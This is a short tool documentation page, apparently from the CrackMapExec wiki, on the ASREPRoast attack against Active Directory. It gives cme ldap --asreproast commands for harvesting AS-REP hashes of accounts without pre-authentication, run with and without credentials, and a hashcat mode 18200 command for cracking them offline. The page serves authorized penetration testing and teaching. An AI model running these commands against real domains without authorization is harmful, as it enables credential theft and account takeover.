---
description: >-
  Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos
  pre-authentication required
---

# ASREPRoast



{% hint style="success" %}
You can retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required if you have a list of users on the domain
{% endhint %}

### Without authentication

> The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS\_REQ request to the KDC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline. More detail in [Kerberos theory](https://www.tarlogic.com/en/blog/how-kerberos-works/).

```
cme ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
```

Using a wordlist, you can find wordlists of username here

```
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

{% hint style="info" %}
Set the password value to '' to perform the test without authentication&#x20;
{% endhint %}

<figure><img src="../../../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

### With authentication

If you have one valid credential on the domain, you can retrieve all the users and hashs where the  Kerberos pre-authentication is not required

```
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
```

{% hint style="info" %}
Use option **kdcHost** when the domain name resolution fail&#x20;

```
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
```
{% endhint %}

<figure><img src="../../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Cracking with hashcat&#x20;

To crack hashes on the file output.txt with hashcat use the following options:

```
hashcat -a 0 -m 18200 output.txt wordlist
```
